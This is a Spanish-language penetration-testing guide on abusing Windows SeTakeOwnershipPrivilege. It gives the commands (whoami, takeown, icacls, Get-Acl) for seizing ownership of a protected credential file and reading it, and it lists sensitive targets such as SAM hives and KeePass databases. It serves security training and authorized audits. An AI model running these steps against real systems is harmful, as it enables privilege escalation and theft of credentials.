
# Abuso de SeTakeOwnershipPrivilege en Windows

## ¿Qué es SeTakeOwnershipPrivilege?

`SeTakeOwnershipPrivilege` otorga a un usuario la capacidad de **tomar posesión de cualquier objeto securizable**, incluyendo:
- Archivos/carpetas NTFS
- Objetos de Active Directory
- Claves de registro
- Servicios, procesos, impresoras, etc.

Otorga derechos `WRITE_OWNER`, es decir, la posibilidad de cambiar el propietario de un objeto en su descriptor de seguridad.

### ¿Quién lo tiene por defecto?
- **Administradores**.
- A veces **cuentas de servicio** (ej: backups o VSS).

Aunque es raro que un usuario estándar tenga este privilegio, si se consigue (por ejemplo, mediante abuso de GPO), se puede usar para escalar privilegios.

---

## Revisión de privilegios actuales

```powershell
whoami /priv
```

Buscar `SeTakeOwnershipPrivilege`. Si aparece como `Disabled`, se puede habilitar:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

---

## Elegir un archivo objetivo

Durante la enumeración, se puede encontrar un archivo protegido como `cred.txt` en un recurso compartido (`\\Shares\Private\IT\cred.txt`) donde se tiene permiso para listar, pero no para leer.

---

## Tomar posesión del archivo

1. **Comprobar el propietario actual:**

```powershell
Get-ChildItem -Path 'C:\...\cred.txt' | Select FullName, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

2. **Tomar posesión del archivo:**

```powershell
takeown /f 'C:\...\cred.txt'
```

3. **Verificar nuevo propietario:**

```powershell
(Get-Acl 'C:\...\cred.txt').Owner
```

---

## Modificar permisos con icacls

Aunque seamos propietarios, aún podemos no tener permisos de lectura.

1. **Agregar permisos:**

```powershell
icacls 'C:\...\cred.txt' /grant TuUsuario:F
```

2. **Leer el contenido:**

```powershell
cat 'C:\...\cred.txt'
```

---

## Consideraciones éticas

- **⚠️ Cambiar propietarios o ACLs es potencialmente destructivo.**
- **Siempre documentar y revertir los cambios si es posible.**
- Informar al cliente si no se pueden revertir.

---

## Archivos sensibles comunes

Archivos locales de interés que se pueden abusar con `SeTakeOwnershipPrivilege`:

- `c:\inetpub\wwwroot\web.config`
- `%WINDIR%\repair\sam`, `system`, `software`, `security`
- `%WINDIR%\system32\config\*.sav`, `*.Evt`
- Bases de datos KeePass `.kdbx`, scripts, archivos de contraseñas (`pass.*`, `creds.*`), VHDs, etc.

---

## Escenarios de uso

- Cuando otras técnicas están bloqueadas.
- Para acceder a archivos con secretos o credenciales.
- En auditorías donde se detecta este privilegio habilitado por GPO o configuración errónea.

---

## Herramientas útiles

- `whoami /priv`
- `takeown`
- `icacls`
- PowerShell: `Get-Acl`, `Set-Acl`
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
